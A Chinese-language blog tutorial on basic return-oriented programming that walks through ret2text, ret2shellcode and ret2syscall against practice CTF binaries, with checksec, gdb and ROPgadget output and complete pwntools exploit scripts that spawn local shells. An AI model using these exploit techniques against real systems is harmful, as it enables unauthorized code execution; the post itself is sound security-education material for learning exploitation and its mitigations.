---
title: 栈溢出之ROP基础
date: 2018-10-27 21:17:50
tags: 漏洞
---
<strong><h1>0x00 前言</h1></strong>
天真无知的我一直以为栈溢出是最简单的 以为结构简单 不像堆溢出那样杂乱无章 但学习了学习ROP之后 发现栈溢出姿势多
也不是那么简单! 本此做一个系列文章 后面会持续发布ROP其他姿势
<strong><h1>0x01 栈溢出介绍</h1></strong>
所谓栈溢出就是在栈结构里一个数据溢出到栈里其他位置 导致其他位置的值被改变 从而达到攻击者自己想要的效果 先给大家看一下栈结构
![rep](https://i.loli.net/2018/10/27/5bd469ca35ff6.png)
给大家举一个例子
```c++
void fun(arg1,arg2){}
当这样的一个fun函数被调用时候
1.先把arg2压入栈 再把啊arg1压入栈
2.将ret返回地址压入栈
3.函数里面其他内容
```
栈是有长度的 而你输入数据如果没有长度限制 你可以把输入的变量覆盖到函数的返回地址 返回到它本不应该返回的地方

但是由于技术的发展 会出现各种保护方式例如 栈中加入cookie去鉴别保护 NX不可执行保护 PIE地址随机化保护 有更厉害的技术就有更厉害的技术破解方法
有大牛就发明处ROP ROP是ret2lib的进化 其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。

详细介绍一下文件保护机制
1.Canary（栈保护）
这个选项表示栈保护功能有没有开启。
栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。
2.NX/DEP（堆栈不可执行）
NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
3.PIE/ASLR（地址随机化）
4.Fortify 
这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。
5.RelRO
设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。
讲硬知识不如上实例 我会把所有用到的例子都打包放到云盘里(看最后！)

<h2>ret2text</h2>
原理:也就是最简单的栈溢出 只需要去覆盖到返回地址为我们想要进行的函数就可以 先用checksec去看保护

```bash
[  9:48下午 ]  [ root@pgone:~/Rep ]
 $ checksec ret2text 
[*] '/root/Rep/ret2text'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
除了NX不可执行没有开 其他什么保护都没有开 我们拖入IDA中看一下
![rep](https://i.loli.net/2018/10/27/5bd46d86c66fa.png)
main函数就这个样子 gets函数没有长度限制 可以使用堆溢出 紧接着在secure函数里面发现有``/bin/sh``
![rep](https://i.loli.net/2018/10/27/5bd46dcf22c1c.png)
那我们可以想办法把gets函数的返回值覆盖为system函数
![rep](https://i.loli.net/2018/10/27/5bd46eb0af0c1.png)
看了一下知道调用system函数是``0x0804863A``
紧接着去看一下gets函数我们要覆写多长距离 
![rep](https://i.loli.net/2018/10/27/5bd46ff13b85d.png)
我们输入s是esp+1c 我们用gdb在调用gets函数位置下一个断点 看一下ebp和esp寄存器
![rep](https://i.loli.net/2018/10/27/5bd47066744ba.png)
会发现我们写入的s(0xffffd27c)与栈底指针rbp(0xffffd2e8)偏移了0x6c 在加入返回地址4字节偏移
所以我们一共要覆盖掉0x6c+4字节数据在加入system函数地址 就可以使用gets返回地址返回到system函数去
```python
##!/usr/bin/python
from pwn import *
sh = process('./ret2text') 
target = 0x804863a   //嗲用system函数的地址
sh.sendline('A' * (0x6c+4) + p32(target))  //0x6c+4的覆盖再加上返回地址
sh.interactive()
```
![rep](https://i.loli.net/2018/10/27/5bd471c58b46e.png)

<h2>ret2shellcode</h2>
原理:ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。
在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。
原理介绍来自CTF-wiki
先checksec保护

```bash
[ 10:12下午 ]  [ root@pgone:~/Rep ]
 $ checksec ret2shellcode 
[*] '/root/Rep/ret2shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
没有NX代码执行保护 那我们可以加入自己的shellcode 拖入IDA了解下
```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```
会发现在进行gets函数之后 又赋值给buf2
![rep](https://i.loli.net/2018/10/27/5bd473aca9270.png)
查看知道buf2存在于bss段 也就是全局段 那我们要看下该段能否执行
```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /root/Rep/ret2shellcode
 0x8049000  0x804a000 r-xp     1000 0      /root/Rep/ret2shellcode
 0x804a000  0x804b000 rwxp     1000 1000   /root/Rep/ret2shellcode
0xf7dd1000 0xf7dea000 r-xp    19000 0      /lib32/libc-2.27.so
0xf7dea000 0xf7fa4000 r-xp   1ba000 19000  /lib32/libc-2.27.so
0xf7fa4000 0xf7fa5000 ---p     1000 1d3000 /lib32/libc-2.27.so
0xf7fa5000 0xf7fa7000 r-xp     2000 1d3000 /lib32/libc-2.27.so
0xf7fa7000 0xf7fa8000 rwxp     1000 1d5000 /lib32/libc-2.27.so
0xf7fa8000 0xf7fab000 rwxp     3000 0      
0xf7fce000 0xf7fd0000 rwxp     2000 0      
0xf7fd0000 0xf7fd3000 r--p     3000 0      [vvar]
0xf7fd3000 0xf7fd5000 r-xp     2000 0      [vdso]
0xf7fd5000 0xf7fd6000 r-xp     1000 0      /lib32/ld-2.27.so
0xf7fd6000 0xf7ffb000 r-xp    25000 1000   /lib32/ld-2.27.so
0xf7ffc000 0xf7ffd000 r-xp     1000 26000  /lib32/ld-2.27.so
0xf7ffd000 0xf7ffe000 rwxp     1000 27000  /lib32/ld-2.27.so
0xfffdd000 0xffffe000 rwxp    21000 0      [stack]
```
会发现`` 0x804a000  0x804b000 rwxp     1000 1000   /root/Rep/ret2shellcode``是可以执行的
后面还是与上面例子一样查覆盖多少数据 依旧是0x6c+4 后加返回地址 不过我们这个的返回不同 我们让它返回到该全局变量 因为全局变量段可执行
```python
#!/usr/bin/python
from pwn import *
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())     //shellcrft.sh()自动生成shellcode  asm将其转成机器码
buf2_addr = 0x804a080                //全局变量地址
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))  //因为要覆盖112个字节 生成的shellcode字节不够 用ljust对齐112字节 不够的补充垃圾字符 
sh.interactive()
```
执行后
```bash
[ 10:23下午 ]  [ root@pgone:~/Rep ]
 $ python flag.py 
[+] Starting local process './ret2shellcode': pid 4334
[*] Switching to interactive mode
No system for you this time !!!
bye bye ~$ ls
1              libc-2.23.so              ret2shellcode
ROPgadget-master      peda-session-hash.txt          ret2text
ROPgadget-master.zip  peda-session-ret2shellcode.txt  rop
flag.py              peda-session-ret2text.txt       ropbaby
hash              peda-session-uaf.txt          uaf
$ pwd
/root/Rep
```

<h2>ret2syscall</h2>
原理:执行系统调用
这个也是刚刚学到的新姿势
先checksec一下

```bash
[ 10:28下午 ]  [ root@pgone:~/Rep ]
 $ checksec rop
[*] '/root/Rep/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
开启了NX保护 拖入IDA后发现也没有内涵的函数可以让我们执行shell
所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用

Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：
应用程序调用库函数（API）；
API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；
内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；
系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；
中断处理函数返回到 API 中；
API 将 EAX 返回给应用程序。

应用程序调用系统调用的过程是：
把系统调用的编号存入 EAX；
把函数参数存入其它通用寄存器；
触发 0x80 号中断（int 0x80）。

这样解释就非常清楚 系统调用号在网上可以搜到 我们本次利用execve("/bin/sh",NULL,NULL)来执行我们的shell
execve的系统调用号是11
那我们按照步骤需要先加入
1.一个pop出的eax
2.加入调用系统函数的系统调用号 也就是0xb
3.寻找ebx ecx edx做后面参数
4.参数/bin/sh NULL NULL
5.0x80触发中段

寻找rop的话ropgadgets是个不错的工具
我们先去需要一个eax
```bash
[ 10:28下午 ]  [ root@pgone:~/Rep ]
 $ ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```
我们选择``0x080bb196 : pop eax ; ret``来作为eax
接近着寻找ebx ecx edx
```bash
[ 10:37下午 ]  [ root@pgone:~/Rep ]
 $ ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```
我们选择`0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret` 因为3个都含有了
在接着我们去寻找`/bin/sh`字符串
```bash
[ 10:39下午 ]  [ root@pgone:~/Rep ]
 $ ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
```
我们使用``0x080be408 : /bin/sh``

最后我们去寻找int 0x80
```bash
[ 10:40下午 ]  [ root@pgone:~/Rep ]
 $ ROPgadget --binary rop  --only 'int'        
Gadgets information
============================================================
0x08049421 : int 0x80
Unique gadgets found: 1
```
我们就使用``0x08049421 : int 0x80``

所以我们构成payload
``addr_pop_eax + 0xb + addr_pop_ebx_ecx_edx + addr_str_binsh + 0 + 0 + addr_int0x80``
最后附上脚本
```python
#!/usr/bin/python
from pwn import *
sh = process('./rop')
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) //使用flat去整合这些是因为用一个加一个的话需要转变为32位参数(p32) 太过于麻烦
sh.sendline(payload)
sh.interactive()
```
执行
```bash
[ 10:44下午 ]  [ root@pgone:~/Rep ]
 $ python flag.py 
[+] Starting local process './rop': pid 4781
[*] Switching to interactive mode
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
$ ls
1              libc-2.23.so              ret2shellcode
ROPgadget-master      peda-session-hash.txt          ret2text
ROPgadget-master.zip  peda-session-ret2shellcode.txt  rop
flag.py              peda-session-ret2text.txt       ropbaby
hash              peda-session-uaf.txt          uaf
$ pwd
/root/Rep
```

例子:https://pan.baidu.com/s/1wL4gDjjBT773_lSt8GqrMQ 提取码: dxx9
资料来源:
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/
https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8